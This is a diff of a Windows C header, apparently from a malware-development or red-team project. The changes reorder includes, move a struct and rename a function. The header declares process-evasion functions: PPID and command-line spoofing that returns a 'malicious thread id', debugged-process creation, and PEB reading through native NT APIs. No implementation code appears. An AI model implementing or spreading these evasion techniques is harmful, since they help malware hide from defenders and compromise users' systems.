@@ -1,26 +1,14 @@
 #pragma once
-#pragma comment(lib, "onecore.lib")
-#pragma comment(lib, "kernel32.lib")
-#pragma comment(lib, "ntdll.lib")
 #include <Windows.h>
+#include <Psapi.h>
 #include <stdlib.h>
 #include <TlHelp32.h>
-#include <Psapi.h>
 #include "Encryption.h"
 #include "Win32FindDataArray.h"
-#include "resource.h"
-#include <winternl.h>
 #include <setupAPI.h>
+#include <winternl.h>
 
-#define		CRT_SECURE_NO_WARNINGS
-
-typedef struct _RESOURCE
-{
-	PVOID  pAddress;
-	size_t sSize;
-
-}RESOURCE, *PRESOURCE;
-
+#include "resource.h"
 typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)
 (
 	SYSTEM_INFORMATION_CLASS SystemInformationClass,
@@ -54,6 +42,14 @@ __kernel_entry NTSTATUS NTQueryProcessInformation
 	IN              ULONG            ProcessInformationLength,
 	   OUT OPTIONAL PULONG           ReturnLength
 );
+
+
+typedef struct _RESOURCE
+{
+	PVOID  pAddress;
+	size_t sSize;
+
+}RESOURCE, * PRESOURCE;
 
 BOOLEAN CreateDebuggedProcess
 (
@@ -232,7 +228,7 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 	   OUT  PDWORD  pdwMaliciousThreadId 
 );
 
-BOOLEAN ReadFromTargetProcessEnvironmentBlock
+BOOLEAN ReadStructureFromProcess
 (
 	IN     HANDLE hTargetProcess, 
 	IN     PVOID  pPEBBaseAddress, 
